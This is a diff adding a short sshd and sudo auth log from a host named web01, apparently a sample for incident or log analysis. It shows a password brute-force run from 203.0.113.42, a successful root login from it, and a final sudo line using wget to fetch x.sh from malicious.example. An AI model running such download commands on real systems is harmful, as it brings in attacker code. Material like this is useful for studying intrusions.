@@ -1,0 +1,33 @@
+Sep 24 05:58:02 web01 sshd[2101]: Accepted password for deploy from 10.0.2.15 port 39114 ssh2
+Sep 24 06:01:17 web01 sshd[2118]: Failed password for admin from 198.51.100.7 port 55012 ssh2
+Sep 24 06:01:21 web01 sshd[2118]: Failed password for admin from 198.51.100.7 port 55012 ssh2
+Sep 24 06:01:26 web01 sshd[2118]: Failed password for admin from 198.51.100.7 port 55012 ssh2
+Sep 24 06:04:55 web01 sshd[2140]: Accepted password for jade from 10.0.2.40 port 41220 ssh2
+Sep 24 06:09:30 web01 sshd[2166]: Failed password for admin from 192.0.2.88 port 60104 ssh2
+Sep 24 06:09:34 web01 sshd[2166]: Failed password for admin from 192.0.2.88 port 60104 ssh2
+Sep 24 06:09:39 web01 sshd[2166]: Failed password for admin from 192.0.2.88 port 60104 ssh2
+Sep 24 06:14:02 web01 sshd[2203]: Failed password for root from 203.0.113.42 port 40112 ssh2
+Sep 24 06:14:06 web01 sshd[2203]: Failed password for root from 203.0.113.42 port 40112 ssh2
+Sep 24 06:14:11 web01 sshd[2203]: Failed password for root from 203.0.113.42 port 40112 ssh2
+Sep 24 06:16:45 web01 sshd[2231]: Invalid user oracle from 203.0.113.42 port 40180
+Sep 24 06:16:45 web01 sshd[2231]: Failed password for invalid user oracle from 203.0.113.42 port 40180 ssh2
+Sep 24 06:17:20 web01 sshd[2248]: Invalid user postgres from 203.0.113.42 port 40206
+Sep 24 06:17:20 web01 sshd[2248]: Failed password for invalid user postgres from 203.0.113.42 port 40206 ssh2
+Sep 24 06:18:03 web01 sshd[2262]: Invalid user test from 203.0.113.42 port 40244
+Sep 24 06:18:03 web01 sshd[2262]: Failed password for invalid user test from 203.0.113.42 port 40244 ssh2
+Sep 24 06:18:51 web01 sshd[2275]: Invalid user git from 203.0.113.42 port 40288
+Sep 24 06:18:51 web01 sshd[2275]: Failed password for invalid user git from 203.0.113.42 port 40288 ssh2
+Sep 24 06:20:14 web01 sshd[2290]: Failed password for admin from 203.0.113.42 port 40320 ssh2
+Sep 24 06:20:19 web01 sshd[2290]: Failed password for admin from 203.0.113.42 port 40320 ssh2
+Sep 24 06:22:40 web01 sshd[2312]: Accepted password for deploy from 10.0.2.15 port 39260 ssh2
+Sep 24 06:24:08 web01 sshd[2330]: Failed password for root from 203.0.113.42 port 40366 ssh2
+Sep 24 06:24:13 web01 sshd[2330]: Failed password for root from 203.0.113.42 port 40366 ssh2
+Sep 24 06:24:18 web01 sshd[2330]: Failed password for root from 203.0.113.42 port 40366 ssh2
+Sep 24 06:27:51 web01 sshd[2358]: Failed password for root from 203.0.113.42 port 40412 ssh2
+Sep 24 06:27:56 web01 sshd[2358]: Failed password for root from 203.0.113.42 port 40412 ssh2
+Sep 24 06:30:33 web01 sshd[2379]: Failed password for root from 203.0.113.42 port 40455 ssh2
+Sep 24 06:30:38 web01 sshd[2379]: Failed password for root from 203.0.113.42 port 40455 ssh2
+Sep 24 06:32:49 web01 sshd[2395]: Failed password for root from 203.0.113.42 port 40480 ssh2
+Sep 24 06:33:12 web01 sshd[2401]: Accepted password for root from 203.0.113.42 port 40501 ssh2
+Sep 24 06:33:58 web01 sshd[2401]: Accepted password for deploy from 10.0.2.15 port 39402 ssh2
+Sep 24 06:34:40 web01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://malicious.example/x.sh
